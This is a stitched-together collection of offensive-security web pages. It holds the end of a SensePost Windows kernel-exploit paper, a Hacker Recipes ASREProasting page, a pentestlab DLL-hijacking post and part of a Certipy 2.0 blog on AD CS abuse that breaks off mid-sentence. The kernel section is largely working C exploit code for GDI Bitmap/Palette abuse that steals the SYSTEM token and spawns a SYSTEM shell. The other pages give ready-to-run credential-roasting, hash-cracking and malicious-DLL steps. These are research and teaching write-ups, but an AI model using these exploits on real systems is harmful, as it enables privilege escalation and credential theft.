end of the memory page. The\ndifference this time is that it should be directly followed by the\nbitmap object, so that we can overflow the Bitmap object height and\nextend its size to gain relative memory read\/write.\nAt this point we have three choices, that we can go with:\n1. The extended Bitmap object can be used as a Manager, to overwrite\nthe pvScan0 member of an adjacent Bitmap object, and use the second\none as Worker.\n2. The extended Bitmap object can be used as a Manager, to overwrite\nan adjacent Palette object (XEPALOBJ) *pFirstColor member, and use\nthe Palette as a Worker.\n3. Demo the full new Palette object technique, using the extended\nBitmap object to overwrite the cEntries member of an adjacent\nPalette object, gaining relative memory read\/write then use the\nmodified Palette object as Manager, to control the *pFirstColor\nmember of a second Palette and use the Second Palette as Worker.\nI decided to go with the last option, to take it as a chance to demo\nthe new technique. To achieve this it is necessary to to perform the\nkernel Pool Feng-shui as explained below.\nKernel Pool Feng-shui\nThe first allocations will be of a bitmap of allocation size 0xFE8,\nsince we know the vulnerable object will have the size of 0x10+0x8\n(POOL_HEADER), so we create 2000 allocations.\n0x1000 \u2013 0x18 = 0xFE8\nfor (int y = 0; y < 2000; y++) {\n\/\/0x3A3 = 0xFe8\nbmp = CreateBitmap(0x3A3, 1, 1, 32, NULL);\nbitmaps[y] = bmp;\n}\nThe Next step is to allocate 2000 Objects of size 0x18, the best object\nthat I found was the Window Class lpszMenuName. Although this is a User\nobject it is one of the User objects that gets allocated to the Pages\nSession Pool, and I think it can be used to leak the address of GDI\nobjects from User objects, but this is beyond the scope of this paper.\n\/\/Spray LpszMenuName User object in GDI pool. Ustx\n\/\/ size 0x10+8\nTCHAR st[0x32];\nfor (int s = 0; s < 2000; s++) {\nWNDCLASSEX Class2 = { 0 };\nwsprintf(st, \"Class%d\", s);\nClass2.lpfnWndProc = DefWindowProc;\nClass2.lpszClassName = st;\nClass2.lpszMenuName = \"Saif\";\nClass2.cbSize = sizeof(WNDCLASSEX);\nif (!RegisterClassEx(&Class2)) {\nprintf(\"bad %d %d\\r\\n\", s, GetLastError());\nbreak;\n}\n}\nThe next step will be to delete(de-allocate) all the large size Bitmap\nobject Gh05 allocated to the beginning of the page.\nfor (int s = 0; s < 2000; s++) {\nDeleteObject(bitmaps[s]);\n}\nAnd allocate smaller Bitmap objects Gh05 of size 0x7F8 that will be\nallocated to the beginning of the Pool Page, hopefully directly after\nthe memory holes, where the vulnerable object will be placed.\nfor (int k = 0; k < 2000; k++) {\n\/\/0x1A6 = 0x7f0+8\nbmp = CreateBitmap(0x1A6, 1, 1, 32, NULL);\nbitmaps[k] = bmp;\n}\nNext 2000 Palette objects Gh08 that will be abused, will be allocated\nwith size 0x7E8 to the remaining free memory in kernel memory pages.\nHPALETTE hps;\nLOGPALETTE *lPalette;\n\/\/0x1E3  = 0x7e8+8\nlPalette = (LOGPALETTE*)malloc(sizeof(LOGPALETTE) + (0x1E3 - 1) * sizeof(PALETTE\nENTRY));\nlPalette->palNumEntries = 0x1E3;\nlPalette->palVersion = 0x0300;\n\/\/ for allocations bigger than 0x98 its Gh08 for less its always 0x98 and the ta\ng is Gla18\nfor (int k = 0; k < 2000; k++) {\nhps = CreatePalette(lPalette);\nif (!hps) {\nprintf(\"%s - %d - %d\\r\\n\", \"CreatePalette - Failed\", GetLastErro\nr(), k);\n}\nhp[k] = hps;\n}\nThen freeing some of the allocated Window Class lpszMenuName, to create\nmemory holes the same size as the vulnerable object allocation, at the\nend of the Pool page.\nTCHAR fst[0x32];\nfor (int f = 500; f < 750; f++) {\nwsprintf(fst, \"Class%d\", f);\nUnregisterClass(fst, NULL);\n}\nIf everything went according to plan the memory layout after the\nvulnerable object is allocated will be as follows.\nRelative read\/write Bitmap GDI Object extension\nNow that the vulnerable object is placed at the end of the page and\ndirectly before a Bitmap object, the out-of-bounds write (mov [esi+3c],\necx), should write the DWORD 0x00000006 which represents the brush\u2019s\nbitmap type (BMF_32BPP) controlled by the biBitCount, to the offset\n0x3C of the vulnerable object, which will fall nicely with the Bitmap\nObject sizlBitmap height member.\nAs shown above, the adjacent Bitmap object sizlBitmap.Height changed,\nfrom 0x1 to 0x6 successfully expanding the Bitmap size, so any\nsubsequent operations on the affected Bitmap object, will result in OOB\nmemory read\/write. The way to find out which Bitmap is extended, will\nbe by iterating over the allocated bitmaps, and find which one can read\ndata using GetBitmapBits, past its original size.\nfor (int i = 0; i < 2000; i++) {\nres = GetBitmapBits(bitmaps[i], 0x6F8, bits);\nif (res > 0x6F8 - 1) {\nhManager = bitmaps[i];\nprintf(\"[*] Manager Bitmap: %d\\r\\n\", i);\nbreak;\n}\n}\nAbusing Palette GDI Objects\nOnce the Bitmap object is found, this Bitmap will be used to set the\ncEntries member of the adjacent Palette(XEPALOBJ) object to 0xFFFFFFFF,\nwhich is located at offset 0x6B8 of the bitmap bits.\n\/\/BYTE *bytes = (BYTE*)&cEntries;\nfor (int y = 0; y < 4; y++) {\nbits[0x6F8 - 8 - 0x38 + y] = 0xFF;\n}\nSetBitmapBits((HBITMAP)hManager, 0x6F8, bits);\nThe adjacent Palette object XEPALOBJ.cEntries before being set by the\nBitmap Object.\nThe updated XEPALOBJ.cEntries.\nBy this point a loop will be performed to find which Palette Object was\nextended by using the GetPaletteEntries function, and monitoring if the\nresult entries count is larger than the original 0x1E3.\nUINT *rPalette;\nrPalette = (UINT*)malloc((0x400 - 1) * sizeof(PALETTEENTRY));\nmemset(rPalette, 0x0, (0x400 - 1) * sizeof(PALETTEENTRY));\nfor (int k = 0; k < 2000; k++) {\nUINT res = GetPaletteEntries(hp[k], 0, 0x400, (LPPALETTEENTRY)rPalet\nte);\nif (res > 0x3BB) {\nprintf(\"[*] Manager XEPALOBJ Object Handle: 0x%x\\r\\n\", h\np[k]);\nhpManager = hp[k];\nbreak;\n}\n}\nOnce the extended Palette Object is found we will save its handle to\nuse it as the Manager, and set the next Palette Object *pFirstColor,\nwhich is at offset 0x3FE from Manager Palette object, to the address of\na fixed Bitmap Object Pool Header.\nUINT wAddress = rPalette[0x3FE];\nprintf(\"[*] Worker XEPALOBJ->pFirstColor: 0x%04x.\\r\\n\", wAddress);\nUINT tHeader = pFirstColor - 0x1000;\ntHeader = tHeader & 0xFFFFF000;\nprintf(\"[*] Gh05 Address: 0x%04x.\\r\\n\", tHeader);\nSetPaletteEntries((HPALETTE)hpManager, 0x3FE, 1, (PALETTEENTRY*)&tHeader);\nAs seen above, the Worker *pFirstColor member was successfully set to\nthe fixed Bitmap object Pool header, which means that arbitrary memory\nread\/write was achieved. The next step is to identify the Worker\nPalette object handle, we know that the fixed Bitmap object least\nsignificant byte of the POOL_HEADER will be 0x35 = 5d, since Gh15\ntranslates to 0x35316847, to identify the Worker Palette Object, a loop\nwill iterate over the allocated Palettes calling GetPaletteEntries,\nuntil a Palette is found that has first entry\u2019s least significant byte\n= 0x35, and save its handle which is going to be our Worker Palette\nobject.\nUINT wBuffer[2];\nfor (int x = 0; x < 2000; x++) {\nGetPaletteEntries((HPALETTE)hp[x], 0, 2, (LPPALETTEENTRY)wBuffer);\nif (wBuffer[1] >> 24 == 0x35) {\nhpWorker = hp[x];\nprintf(\"[*] Worker XEPALOBJ object Handle: 0x%x\\r\\n\", hp\nWorker);\nprintf(\"[*] wBuffer: %x\\r\\n\", wBuffer[1]);\nbreak;\n}\n}\nThe arbitrary memory read\/write will be used to fix the clobbered\nBitmap object header.\nVersionSpecificConfig gConfig = { 0x0b4 , 0x0f8 };\nvoid SetAddress(UINT* address) {\nSetPaletteEntries((HPALETTE)hpManager, 0x3FE, 1, (PALETTEENTRY*)addr\ness);\n}\nvoid WriteToAddress(UINT* data, DWORD len) {\nSetPaletteEntries((HPALETTE)hpWorker, 0, len, (PALETTEENTRY*)data);\n}\nUINT ReadFromAddress(UINT src, UINT* dst, DWORD len) {\nSetAddress((UINT *)&src);\nDWORD res = GetPaletteEntries((HPALETTE)hpWorker, 0, len, (LPPALETTE\nENTRY)dst);\nreturn res;\n}\nSteal Token 32-bit\nWith arbitrary kernel memory read\/write and all headers fixed, we can\nnow get the kernel pointer to a SYSTEM process _EPROCESS structure, and\ncopy and replace the SecurityToken of the current process as explained\nin a [31]previous post.\n\/\/ get System EPROCESS\nUINT SystemEPROCESS = PsInitialSystemProcess();\n\/\/fprintf(stdout, \"\\r\\n%x\\r\\n\", SystemEPROCESS);\nUINT CurrentEPROCESS = PsGetCurrentProcess();\n\/\/fprintf(stdout, \"\\r\\n%x\\r\\n\", CurrentEPROCESS);\nUINT SystemToken = 0;\n\/\/ read token from system process\nReadFromAddress(SystemEPROCESS + gConfig.TokenOffset, &SystemToken, 1);\nfprintf(stdout, \"[*] Got System Token: %x\\r\\n\", SystemToken);\n\/\/ write token to current process\nUINT CurProccessAddr = CurrentEPROCESS + gConfig.TokenOffset;\nSetAddress(&CurProccessAddr);\nSYSTEM!!\nNow the current process has a SYSTEM level token, and will continue\nexecution as SYSTEM, calling cmd.exe will drop into a SYSTEM shell.\nsystem(\"cmd.exe\");\nMore Details:\nDefcon 25: [32]5A1F \u2013 Demystifying Windows Kernel Exploitation by\nAbusing GDI objects\nWhite-paper, slides, MS16-098 & MS17-017 exploit:\n[33]https:\/\/github.com\/sensepost\/gdi-palettes-exp\nReferences:\n[1] ReactOS x86 Palette object:\n[34]https:\/\/www.reactos.org\/wiki\/Techwiki:Win32k\/PALETTE\n[2] GDIOBjDump: [35]https:\/\/github.com\/CoreSecurity\/GDIObjDump\n[3] 360Vulcan team Win32k Dark Composition:\n[36]https:\/\/www.slideshare.net\/CanSecWest\/csw2017-peng-qiushefangzhong-\nwin32k-darkcompositionfinnalfinnalrmmark\nGet in touch with us\n[37]sensepost@orangecyberdefense.com\nPlease select your enquiry type, and we'll get back to you as soon as\npossible\n[General_______________________]\n____________________\n____________________\n____________________\n____________________________________________________________\n____________________________________________________________\n____________________________________________________________\n____________________________________________________________\n(BUTTON) Get in touch\nBy clicking \u2018Get in touch\u2019 you agree to Orange Cyberdefense's [38]Terms of\nService\nOrange Cyberdefense Pretoria (Head Office)\n[39]+27 (0)12 460 0880\nPark Lane West, 197 Amarand Ave, Waterkloof Glen, Pretoria, South\nAfrica\nOrange Cyberdefense London (Head Office)\n[40]+44 (0)2070 781 360\nSensePost, 250 Waterloo Road, SE1 8RD, London, United Kingdom\nOrange Cyberdefense Cape Town\n[41]+27 (0)12 460 0880\n183 Albion Springs Corner Main Road &, Albion Springs Cl,, Rondebosch,\nCape Town, South Africa\n[42]Linked In [43]RSS Feed\n[creds_logos.png]\n\u00a9 Orange Cyberdefense 2023"}
{"text":"The Hacker Recipes\n[1]GitHub[2]Twitter[3]Exegol[4]Tools\n(BUTTON)\nAsk or search\u2026\n\u2303K\nLinks\nIntroduction\nActive Directory\nReconnaissance\nMovement\nCredentials\nMITM and coerced auths\nNTLM\nKerberos\nPre-auth bruteforce\nPass the key\nOverpass the hash\nPass the ticket\nPass the cache\nForged tickets\nASREQroast\nASREProast\nKerberoast\nDelegations\nShadow Credentials\nUnPAC the hash\nPass the Certificate\nsAMAccountName spoofing\nSPN-jacking\nDACL abuse\nGroup policies\nTrusts\nNetlogon\nCertificate Services (AD-CS)\nSCCM \/ MECM\nExchange services\nPrint Spooler Service\nBuilt-ins & settings\nPersistence\nWeb services\nReconnaissance\nConfiguration\nAccounts and sessions\nUser inputs\nSystems & services\nReconnaissance\nInitial access (protocols)\nInitial access (phishing)\nPrivilege escalation\nPivoting\nEvasion\n(AV) Anti-Virus\n\ud83d\udee0\ufe0f (EDR) Endpoint Detection and Response\n\ud83d\udee0\ufe0f Physical\nLocks\nNetworking\nMachines\nSuper secret zones\n\ud83d\udee0\ufe0f Intelligence gathering\nCYBINT\nOSINT\nGEOINT\n\ud83d\udee0\ufe0f RADIO\nRFID\nBluetooth\nWi-Fi\nWireless keyboard\/mouse\n\ud83d\udee0\ufe0f mobile apps\nAndroid\niOS\nPowered By GitBook\nComment on page\nASREProast\nTheory\nThe Kerberos authentication protocol works with tickets in order to\ngrant access. A ST (Service Ticket) can be obtained by presenting a TGT\n(Ticket Granting Ticket). That prior TGT can be obtained by validating\na first step named \"pre-authentication\" (except if that requirement is\nexplicitly removed for some accounts, making them vulnerable to\nASREProast).\nThe pre-authentication requires the requesting user to supply its\nsecret key (DES, RC4, AES128 or AES256) derived from the user password.\nTechnically, when asking the KDC (Key Distribution Center) for a TGT\n(Ticket Granting Ticket), the requesting user needs to validate\npre-authentication by sending a timestamp encrypted with it's own\ncredentials. It ensures the user is requesting a TGT for himself. Once\nvalidated, the TGT is then sent to the user in the KRB_AS_REP message,\nbut that message also contains a session key. That session key is\nencrypted with the requested user's NT hash.\nBecause some applications don't support Kerberos preauthentication, it\nis common to find users with Kerberos preauthentication disabled, hence\nallowing attackers to request TGTs for these users and crack the\nsession keys offline. This is ASREProasting.\nWhile this technique can possibly allow to retrieve a user's\ncredentials, the TGT obtained in the KRB_AS_REP messages are encrypted\ncannot be used without knowledge of the account's password.\nPractice\nWhile this attack can be carried out without any prior foothold (domain\nuser credentials), there is no way of finding out users with Do not\nrequire Kerberos preauthentication set without that prior foothold.\nUNIX-like\nWindows\nThe [5]Impacket script [6]GetNPUsers (Python) can get TGTs for the\nusers that have the property Do not require Kerberos preauthentication\nset.\n# users list dynamically queried with an LDAP anonymous bind\nGetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt\n-dc-ip $KeyDistributionCenter 'DOMAIN\/'\n\u200b\n# with a users file\nGetNPUsers.py -usersfile users.txt -request -format hashcat -outputfile\nASREProastables.txt -dc-ip $KeyDistributionCenter 'DOMAIN\/'\n\u200b\n# users list dynamically queried with a LDAP authenticated bind\n(password)\nGetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt\n-dc-ip $KeyDistributionCenter 'DOMAIN\/USER:Password'\n\u200b\n# users list dynamically queried with a LDAP authenticated bind (NT\nhash)\nGetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt\n-hashes 'LMhash:NThash' -dc-ip $KeyDistributionCenter 'DOMAIN\/USER'\nThis can also be achieved with [7]CrackMapExec (Python).\ncrackmapexec ldap $TARGETS -u $USER -p $PASSWORD --asreproast\nASREProastables.txt --KdcHost $KeyDistributionCenter\nThe [8]kerberoast pure-python toolkit is a good alternative to the\ntools mentioned above.\nThe same thing can be done with [9]Rubeus from a session running with a\ndomain user privileges.\nRubeus.exe asreproast \/format:hashcat \/outfile:ASREProastables.txt\nDepending on the output format used (hashcat or john), [10]hashcat and\n[11]JohnTheRipper can be used to try [12]cracking the hashes.\nhashcat -m 18200 -a 0 ASREProastables.txt $wordlist\njohn --wordlist=$wordlist ASREProastables.txt\nResources\n@_xpn_ - Kerberos AD Attacks - More Roasting with AS-REP\nXPN InfoSec Blog\nRoasting AS-REPs\nharmj0y\nKerberos Pre-Authentication: Why It Should Not Be Disabled - TechNet\nArticles - United States (English) - TechNet Wiki\nKerberos in Active Directory\nhackndo\nPrevious\nASREQroast\nNext\nKerberoast\nLast modified 6mo ago\nOn this page\nTheory\nPractice\nResources"}
{"text":"#[1]Penetration Testing Lab \u00bb Feed [2]Penetration Testing Lab \u00bb\nComments Feed [3]Penetration Testing Lab \u00bb DLL Hijacking Comments Feed\n[4]alternate [5]alternate [6]Penetration Testing Lab [7]WordPress.com\n[8]Skip to content\n[9]Penetration Testing Lab\nOffensive Techniques & Methodologies\n(BUTTON) Menu\n* [10]Methodologies\n+ [11]Red Teaming\no [12]Persistence\n* [13]Resources\n+ [14]Papers\no [15]Web Application\n+ [16]Presentations\no [17]Defcon\no [18]DerbyCon\no [19]Tools\n+ [20]Videos\no [21]BSides\no [22]Defcon\no [23]DerbyCon\no [24]Hack In Paris\n* [25]Contact\n+ [26]About Us\nPosted on [27]March 27, 2017March 28, 2017\nDLL Hijacking\nby [28]Administrator.In [29]Privilege Escalation.[30]5 Comments on DLL\nHijacking\nIn Windows environments when an application or a service is starting it\nlooks for a number of DLL\u2019s in order to function properly. If these\nDLL\u2019s doesn\u2019t exist or are implemented in an insecure way (DLL\u2019s are\ncalled without using a fully qualified path) then it is possible to\nescalate privileges by forcing the application to load and execute\na malicious DLL file.\nIt should be noted that when an application needs to load a DLL it will\ngo through the following order:\n* The directory from which the application is loaded\n* C:\\Windows\\System32\n* C:\\Windows\\System\n* C:\\Windows\n* The current working directory\n* Directories in the system PATH environment variable\n* Directories in the user PATH environment variable\nStep 1 \u2013 Processes with Missing DLL\u2019s\nThe first step is to list all the processes on the system and discover\nthese processes which are running as SYSTEM and are missing DLL\u2019s. This\ncan be done just by using the [31]process monitor tool from\nSysinternals and by applying the filters below:\nProcmon Filters Procmon Filters to Check a Process for Missing DLL\nProcess Monitor will identify if there is any DLL that the application\ntries to load and the actual path that the application is looking for\nthe missing DLL.\nProcess with Missing DLL Process with Missing DLL\nIn this example the process Bginfo.exe is missing several DLL files\nwhich possibly can be used for privilege escalation.\nStep 2 \u2013 Folder Permissions\nBy default if a software is installed on the C:\\ directory instead of\nthe C:\\Program Files then authenticated users will have write access on\nthat directory. Additionally software like Perl, Python, Ruby etc.\nusually are added to Path variable. This give the opportunity of\nprivilege escalation since the user can write a malicious DLL in that\ndirectory which is going to be loaded the next time that the process\nwill restart with the permission of that process.\nFolder-Permissions Identification of Weak Folder Permissions\nStep 3 \u2013 DLL Hijacking\nMetasploit can be used in order to generate a DLL that will contain a\npayload which will return a session with the privileges of the service.\nGenerating Malicious DLL Generation of Malicious DLL\nThe process Bginfo.exe it is running as SYSTEM which means these\nprivileges will be granted to the user upon restart of the service\nsince the DLL with the malicious payload will be loaded and executed by\nthe process.\nProcess Running as SYSTEM Process Running as SYSTEM\nAs it has been identified above the process is missing the Riched32.dll\nso the pentestlab.dll needs to be renamed as Riched32.dll. This will\nconfuse the application and it will try to load it as the application\nwill think that this is a legitimate DLL. This malicious DLL needs to\nbe dropped in one of the folders that windows are loading DLL files.\nMalicious DLL Renamed and Planted Malicious DLL Renamed and Planted\nAs it can be see below when the service restarted a Meterpreter session\nopened with SYSTEM privileges through DLL hijacking.\nMetasploit - Privilege Escalation via DLL Hijacking Metasploit \u2013\nPrivilege Escalation via DLL Hijacking\nPowerSploit\nThe process of DLL hijacking can be done also through PowerSploit since\nit contains three modules that can assist in the identification of\nservices that are missing DLL\u2019s, discovery of folders that users have\nmodification permissions and generation of DLL\u2019s.\nThe module Find-ProcessDLLHijack will identify all the processes on the\nsystem that are trying to load DLL\u2019s which are missing.\nPowerSploit - Discovery of Process with Missing DLL's PowerSploit \u2013\nDiscovery of Process with Missing DLL\u2019s\nThe next step is the identification of paths that the user can modify\nthe content. The folders identified will be the ones that the\nmalicious .DLL needs to be planted.\nPowerSploit - Discovery of Paths with Weak Permissions Discovery of\nFolders with Modifiable Permissions\nThe last step is to generate the hijackable DLL into one of the folders\nthat have been identified above with Modify (M) permissions.\nPowerSploit - Write DLL Write the DLL into the folder with weak\npermissions\nConclusion\nIn order to be able to escalate privileges via DLL hijacking the\nfollowing conditions needs to be in place:\n* Write Permissions on a system folder\n* Software installation in a non-default directory\n* A service that is running as system and is missing a DLL\n* Restart of the service\nDiscovering applications that are not installed in the Program files it\nis something common as except of third-party applications that are not\nforced to be installed in that path there is a possibility of a\ncustom-made software to be found outside of these protected folders.\nAdditionally there are a number of windows services like IKEEXT (IKE\nand AuthIP IPsec Keying Modules) that are missing DLL\u2019s (wlbsctrl.dll)\nand can be exploited as well either manually or automatically. For\nIKEEXT there is a specific Metasploit module:\nexploit\/windows\/local\/ikeext_service\nRate this:\nShare this:\n* [32]Twitter\n* [33]Facebook\n* [34]LinkedIn\n* [35]Reddit\n* [36]Tumblr\n* [37]WhatsApp\n* [38]Telegram\n* [39]Pinterest\n* [40]Pocket\n* [41]Email\n*\nLike Loading...\nRelated\n[42]DLL[43]DLL Hijacking[44]Metasploit[45]PowerSploit[46]Privilege\nEscalation\n5 Comments\n1.\n[47]KNX says:\n[48]March 30, 2017 at 8:05 am\nReblogged this on [49]KNX Security \u2013 Practical Penetration Test.\n[50]Reply\n2. Pingback: [51]DLL Hijacking \u2013 CTS 4 NG\n3. Pingback: [52]Persistence \u2013 DLL Hijacking | Penetration Testing Lab\n4. Pingback: [53]I Like to Move It: Windows Lateral Movement Part 3:\nDLL Hijacking - MDSec\n5. Pingback: [54]CVE-2021-26807 \u2013 GOG GALAXY v2.0.35 DLL Load Order\nHijacking | Jeff Stokes\nLeave a Reply [55]Cancel reply\n\u0394\n_____________________________________________\n_____________________________________________\n_____________________________________________\n_____________________________________________\n_____________________________________________\n_____________________________________________\n_____________________________________________\n_____________________________________________\nPost navigation\n[56]Previous Previous post: Group Policy Preferences\n[57]Next Next post: Weak Service Permissions\nFollow PenTest Lab\nEnter your email address to follow this blog and receive notifications\nof new articles by email.\nEmail Address: ____________________\n(BUTTON) Follow\nJoin 2,591 other subscribers\nSearch Topic\n____________________ (BUTTON) Search\nRecent Posts\n* [58]Persistence \u2013 Event Log\n* [59]Initial Access \u2013 search-ms URI Handler\n* [60]Persistence \u2013 Scheduled Task Tampering\n* [61]Persistence \u2013 Windows Telemetry\n* [62]Persistence \u2013 Service Control Manager\nCategories\n* [63]Coding (10)\n* [64]Exploitation Techniques (19)\n* [65]External Submissions (3)\n* [66]General Lab Notes (22)\n* [67]Information Gathering (12)\n* [68]Infrastructure (2)\n* [69]Maintaining Access (4)\n* [70]Mobile Pentesting (7)\n* [71]Network Mapping (1)\n* [72]Post Exploitation (13)\n* [73]Red Team (123)\n+ [74]Credential Access (3)\n+ [75]Defense Evasion (22)\n+ [76]Domain Escalation (5)\n+ [77]Domain Persistence (4)\n+ [78]Initial Access (1)\n+ [79]Lateral Movement (2)\n+ [80]Man-in-the-middle (1)\n+ [81]Persistence (34)\n+ [82]Privilege Escalation (17)\n* [83]Reviews (1)\n* [84]Social Engineering (11)\n* [85]Tools (7)\n* [86]VoIP (4)\n* [87]Web Application (14)\n* [88]Wireless (2)\nPentest Laboratories Discord\n* [89]Discord\nPen Test Lab Stats\n* 7,183,938 hits\n[90]Facebook Page\n[91]Facebook Page\n__________________________________________________________________\n[92]Blog at WordPress.com.\n* [93]Methodologies\n+ [94]Red Teaming\no [95]Persistence\n* [96]Resources\n+ [97]Papers\no [98]Web Application\n+ [99]Presentations\no [100]Defcon\no [101]DerbyCon\no [102]Tools\n+ [103]Videos\no [104]BSides\no [105]Defcon\no [106]DerbyCon\no [107]Hack In Paris\n* [108]Contact\n+ [109]About Us\n* [110]Comment\n* [111]Reblog\n* [112]Subscribe [113]Subscribed\n+ [114]Penetration Testing Lab\nJoin 2,289 other subscribers\n____________________\n(Sign me up) Sign me up\n+ Already have a WordPress.com account? [115]Log in now.\n*\n+ [116]Penetration Testing Lab\n+ [117]Customize\n+ [118]Subscribe [119]Subscribed\n+ [120]Sign up\n+ [121]Log in\n+ [122]Copy shortlink\n+ [123]Report this content\n+ [124]View post in Reader\n+ [125]Manage subscriptions\n+ [126]Collapse this bar\nLoading Comments...\nWrite a Comment...\n____________________________________________________________\n____________________________________________________________\n____________________________________________________________\n____________________________________________________________\nEmail (Required) ____________________\nName (Required) ____________________\nWebsite ____________________\nPost Comment\nIFRAME: [127]likes-master\n%d"}
{"text":"#[1]Medium [2]alternate\n[3]Open in app\n[4]Sign up\n[5]Sign in\n____________________\nWrite\n[6]Sign up\n[7]Sign in\n(BUTTON)\nCertipy 2.0: BloodHound, New Escalations, Shadow Credentials, Golden\nCertificates, and more!\nOliver Lyak\nIFCR\n[8]Oliver Lyak\n\u00b7\n[9]Follow\nPublished in\n[10]\nIFCR\n\u00b7\n16 min read\n\u00b7\nFeb 19, 2022\n--\n(BUTTON)\n(BUTTON)\nListen\n(BUTTON)\nShare\nAs the title states, the latest release of [11]Certipy contains many\nnew features, techniques and improvements. This blog post dives into\nthe technical details of many of them.\nPublic Key Infrastructure can be difficult to set up. Users and\nadministrators are often not fully aware of the implications of ticking\na single checkbox \u2014 especially when that single checkbox is what\n(finally) made things work.\nIt\u2019s been almost five months since the first release of Certipy. Back\nthen, Certipy was just a small tool for abusing and enumerating Active\nDirectory Certificate Services (AD CS) misconfigurations. Since then,\nour offensive team at [12]Institut For Cyber Risk have come across many\ndifferent AD CS environments during our engagements, which required new\nadditions and features.\nThese have been implemented and [13]Certipy 2.0 is now ready for public\nrelease.\nBloodHound integration\nOne of the major new features of Certipy is BloodHound integration. The\nold version had a simple feature to find vulnerable certificate\ntemplates based on the current user\u2019s group memberships. But as we\u2019ll\nsee in a bit, integrating with BloodHound is just better.\nBy default, the new version of Certipy will output the enumeration\nresults in both BloodHound data as well as text- and JSON-format. I\u2019ve\noften found myself running the tool multiple times because I wanted to\nview the output in a different format.\nIt is however possible to output only BloodHound data, JSON, or text by\nspecifying one or more of the switches -bloodhound, -json, or -text,\nrespectively.\nThe BloodHound data is saved as a ZIP-file that can be imported into\nthe latest version of BloodHound (4.1.0 at the time of writing). Please\nnote that Certipy uses BloodHound\u2019s new format, introduced in version\n4.\nNew edges and nodes means new queries. I have created the most\nimportant queries that Certipy supports. The queries can be found in\nthe [14]repository and imported into your own BloodHound setup.\nCertipy\u2019s BloodHound queries\nThe new version of Certipy can abuse all of the scenarios listed in the\n\u201cDomain Escalation\u201d category. Suppose we have taken over the domain\nuser account JOHN. Let\u2019s start with one of the first queries, \u201cShortest\nPaths to Misconfigured Certificate Templates from Owned Principals\n(ESC1)\u201d.\nShortest Paths to Misconfigured Certificate Templates from Owned\nPrincipals (ESC1)\nThis is a fairly simple path. But as we go through the escalation\nqueries, we might see why BloodHound is just better, as attack paths\ncan be built, using the imported Certipy data.\nShortest Paths to Vulnerable Certificate Template Access Control from\nOwned Principals (ESC4)\nNew Escalation Techniques\nThe whitepaper [15]\u201cCertified Pre-Owned\u201d lists 8 domain escalation\ntechniques for misconfigurations in AD CS (ESC1-ESC8). Previously, only\nESC1 and ESC6 were supported by Certipy, and ESC8 was supported by\nImpacket\u2019s [16]ntlmrelayx. While ESC1 and ESC8 are the vulnerabilities\nwe\u2019ve seen the most, we\u2019ve also come across other misconfigurations,\nwhich is why I have implemented all of them, except for ESC5 which is\ntoo abstract.\nAs such, Certipy now supports abusing all of the escalation techniques\nlisted in the queries.\nESC1 \u2014 Misconfigured Certificate Templates\nShortest Paths to Misconfigured Certificate Templates from Owned\nPrincipals (ESC1)\nThe most common misconfiguration we\u2019ve seen during our engagements is\nESC1. In essence, ESC1 is when a certificate template permits Client\nAuthentication and allows the enrollee to supply an arbitrary Subject\nAlternative Name (SAN).\nThe previous release of Certipy had support for this technique as well,\nbut the new version comes with improvements, and therefore, I will\ndemonstrate all of the escalation techniques that the new version of\nCertipy supports.\nFor ESC1, we can just request a certificate based on the vulnerable\ncertificate template and specify an arbitrary SAN with the -alt\nparameter.\nA new feature of Certipy is that certificates and private keys are now\nstored in PKCS#12 format. This allows us to pack the certificate and\nprivate key together in a standardized format.\nAnother neat feature is that the auth command will try to retrieve the\ndomain and username from the certificate for authentication.\nIn most cases, this will not work, usually because the domain name\ncannot be resolved. To work around this, all the necessary parameters\ncan be specified on the command line if needed.\nESC2 \u2014 Misconfigured Certificate Templates\nShortest Paths to Misconfigured Certificate Templates from Owned\nPrincipals (ESC2)\nESC2 is when a certificate template can be used for any purpose. The\nwhitepaper \u201cCertified Pre-Owned\u201d does not mention any specific domain\nescalation technique that works out of the box for ESC2. But since the\ncertificate can be used for any purpose, it can be used for the same\ntechnique as with ESC3, which we\u2019ll see below.\nESC3 \u2014 Misconfigured Enrollment Agent Templates\nShortest Paths to Enrollment Agent Templates from Owned Principals\n(ESC3)\nESC3 is when a certificate template specifies the Certificate Request\nAgent EKU (Enrollment Agent). This EKU can be used to request\ncertificates on behalf of other users. As we can see in the path above,\nthe ESC2 certificate template is vulnerable to ESC3 as well, since the\nESC2 template can be used for any purpose.\nFirst, let\u2019s request a certificate based on ESC3.\nWith our new Certificate Request Agent certificate we can request\ncertificates on behalf of other users by specifying the -on-behalf-of\nparameter along with our Certificate Request Agent certificate. The\n-on-behalf-of parameter value must be in the form of domain\\user, and\nnot the FQDN of the domain, i.e. corp rather than corp.local.\nFor good measure, here\u2019s the same attack with the ESC2 certificate\ntemplate.\nESC4 \u2014 Vulnerable Certificate Template Access Control\nShortest Paths to Vulnerable Certificate Template Access Control from\nOwned Principals (ESC4)\nESC4 is when a user has write privileges over a certificate template.\nThis can for instance be abused to overwrite the configuration of the\ncertificate template to make the template vulnerable to ESC1.\nAs we can see in the path above, only JOHNPC has these privileges, but\nour user JOHN has the new AddKeyCredentialLink edge to JOHNPC. Since\nthis technique is related to certificates, I have implemented this\nattack as well, which is known as [17]Shadow Credentials. Here\u2019s a\nlittle sneak peak of Certipy\u2019s shadow auto command to retrieve the NT\nhash of the victim.\nWe\u2019ll go into more details about the technique later in this post, but\nfor now, we just want the NT hash of JOHNPC.\nThe new version of Certipy can overwrite the configuration of a\ncertificate template with a single command. By default, Certipy will\noverwrite the configuration to make it vulnerable to ESC1. We can also\nspecify the -save-old parameter to save the old configuration, which\nwill be useful for restoring the configuration after our attack. Be\nsure to do this, if using Certipy outside a test environment.\nAs we can see below, the new configuration will allow Authenticated\nUsers full control over the certificate template. Moreover, the new\ntemplate can be used for any purpose, and the enrollee supplies the\nSAN, meaning it\u2019s vulnerable to ESC1.\nWhen we\u2019ve overwritten the configuration, we can simply request a\ncertificate based on the ESC4 template as we would do with ESC1.\nIf we want to restore the configuration afterwards, we can just specify\nthe path to the saved configuration with the -configuration parameter.\nYou can also use this parameter to set custom configurations.\nESC5 \u2014 Vulnerable PKI Object Access Control\nESC5 is when objects outside of certificate templates and the\ncertificate authority itself can have a security impact on the entire\nAD CS system, for instance the CA server\u2019s AD computer object or the CA\nserver\u2019s RPC\/DCOM server. This escalation technique has not been\nimplemented in Certipy, because it\u2019s too abstract. However, if the CA\nserver is compromised, you can perform the ESC7 